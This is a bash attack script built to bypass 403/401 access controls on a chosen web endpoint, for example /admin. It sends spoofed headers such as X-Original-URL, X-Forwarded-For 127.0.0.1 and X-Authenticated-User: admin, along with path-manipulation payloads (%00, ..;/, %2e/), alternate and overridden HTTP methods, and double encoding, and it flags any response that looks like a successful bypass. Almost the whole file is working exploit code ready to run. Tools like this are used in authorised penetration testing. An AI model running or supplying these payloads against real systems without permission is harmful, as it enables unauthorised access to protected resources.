#!/bin/bash

# usage:
# ./script.sh -u https://target.com -e /admin
# ./script.sh -u https://target.com -e /admin -H "Cookie: test; Authorization: Bearer xyz"

#####################################
# Colors
#####################################
GREEN="\033[0;32m"
RED="\033[0;31m"
ORANGE="\033[0;33m"
PINK="\033[1;35m"
NC="\033[0m"

#####################################
# Parse args
#####################################
while getopts "u:e:H:" opt; do
  case $opt in
    u) URL="$OPTARG" ;;
    e) ENDPOINT="$OPTARG" ;;
    H) CUSTOM_HEADERS="$OPTARG" ;;
    *) echo "Usage: $0 -u https://target.com -e /endpoint [-H 'Header1: v; Header2: v']"; exit 1 ;;
  esac
done

if [[ -z "$URL" || -z "$ENDPOINT" ]]; then
  echo "Usage: $0 -u https://target.com -e /endpoint [-H 'Header1: v; Header2: v']"
  exit 1
fi

BASE="${URL%/}"
EP="${ENDPOINT}"

echo "[*] Target: $BASE"
echo "[*] Endpoint: $EP"
echo ""

#####################################
# Default UA
#####################################
UA="Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120 Safari/537.36"

#####################################
# Custom headers
#####################################
CURL_HEADERS=()
CURL_HEADERS+=(-H "User-Agent: $UA")

if [[ -n "$CUSTOM_HEADERS" ]]; then
  IFS=';' read -ra HDRS <<< "$CUSTOM_HEADERS"
  for h in "${HDRS[@]}"; do
    CLEAN=$(echo "$h" | xargs)
    CURL_HEADERS+=(-H "$CLEAN")
  done
fi

#####################################
# Color status
#####################################
color_status() {
  local code=$1

  if [[ $code =~ ^2 ]]; then
    echo -e "${GREEN}$code${NC}"
  elif [[ $code =~ ^3 ]]; then
    echo -e "${PINK}$code${NC}"
  elif [[ $code =~ ^4 ]]; then
    echo -e "${RED}$code${NC}"
  elif [[ $code =~ ^5 ]]; then
    echo -e "${ORANGE}$code${NC}"
  else
    echo "$code"
  fi
}

#####################################
# Bypass logic (fixed)
#####################################
is_bypass() {
  local base_code=$1
  local code=$2
  local base_size=$3
  local size=$4

  # blocked -> allowed
  if [[ "$base_code" =~ ^(401|403|404)$ ]] && [[ "$code" =~ ^(200|201|202|204|301|302|307|308)$ ]]; then
    return 0
  fi

  # same status but large diff
  if [[ "$code" == "$base_code" ]]; then
    diff=$(( size > base_size ? size - base_size : base_size - size ))
    if [[ $diff -gt 1000 ]]; then
      return 0
    fi
  fi

  return 1
}

#####################################
# Request function
#####################################
send_request() {
  local desc="$1"
  local payload="$2"
  shift 2

  RESULT=$(curl -sk "${CURL_HEADERS[@]}" -o /dev/null -w "%{http_code} %{size_download}" "$@")
  CODE=$(echo $RESULT | awk '{print $1}')
  SIZE=$(echo $RESULT | awk '{print $2}')

  COLORED=$(color_status "$CODE")

  printf "[%-45s] => Status: %s | Size: %s\n" "$desc" "$COLORED" "$SIZE"

  if is_bypass "$BASE_CODE" "$CODE" "$BASE_SIZE" "$SIZE"; then
    echo -e "  ${GREEN}>>> POSSIBLE BYPASS using: $payload${NC}"
  fi
}

#####################################
# Baseline
#####################################
BASE_RESULT=$(curl -sk "${CURL_HEADERS[@]}" -o /dev/null -w "%{http_code} %{size_download}" "$BASE$EP")
BASE_CODE=$(echo $BASE_RESULT | awk '{print $1}')
BASE_SIZE=$(echo $BASE_RESULT | awk '{print $2}')

echo "[*] Baseline => $BASE_CODE | $BASE_SIZE bytes"
echo ""

#####################################
# HEADER TESTS
#####################################
headers=(
  "X-Original-URL: $EP"
  "X-Rewrite-URL: $EP"
  "X-Forwarded-URL: $EP"
  "X-Forwarded-Uri: $EP"
  "X-Request-URI: $EP"
  "X-URL: $EP"
  "Forwarded: for=127.0.0.1;host=localhost"
  "X-Forwarded-For: 127.0.0.1"
  "X-Forwarded-For: 2130706433"
  "X-Forwarded-For: 127.0.0.1, 1.1.1.1"
  "X-Real-IP: 127.0.0.1"
  "X-Forwarded-Host: localhost"
  "X-HTTP-Host-Override: localhost"
  "X-Authenticated-User: admin"
  "X-Remote-User: admin"
  "Referer: $BASE/"
  "Origin: $BASE"
)

for h in "${headers[@]}"; do
  send_request "$h" "$h" -H "$h" "$BASE$EP"
done

#####################################
# 🔥 IMPORTANT: URL override via /
#####################################
send_request "X-Original-URL via /" "X-Original-URL: $EP" \
  -H "X-Original-URL: $EP" "$BASE/"

send_request "X-Rewrite-URL via /" "X-Rewrite-URL: $EP" \
  -H "X-Rewrite-URL: $EP" "$BASE/"

#####################################
# PATH BYPASS
#####################################
paths=(
  "$EP/"
  "$EP/."
  "$EP%00"
  "$EP%09"
  "$EP..;/"
  "$EP%2e/"
  "$EP/.."
  "$EP%2f"
)

for p in "${paths[@]}"; do
  send_request "Path: $p" "$BASE$p" "$BASE$p"
done

#####################################
# METHODS (expanded)
#####################################
methods=("GET" "POST" "PUT" "DELETE" "OPTIONS" "PATCH" "HEAD" "TRACE")

for m in "${methods[@]}"; do
  send_request "Method: $m" "$m $BASE$EP" -X "$m" "$BASE$EP"
done

#####################################
# METHOD OVERRIDE
#####################################
for m in "GET" "POST" "PUT"; do
  send_request "Override: $m" "X-HTTP-Method-Override: $m" \
    -X POST -H "X-HTTP-Method-Override: $m" "$BASE$EP"
done

#####################################
# DOUBLE ENCODING
#####################################
ENCODED=$(printf '%s' "$EP" | sed 's/\//%252f/g')
send_request "Double encoded" "$BASE$ENCODED" "$BASE$ENCODED"

echo -e "\n[+] Done"
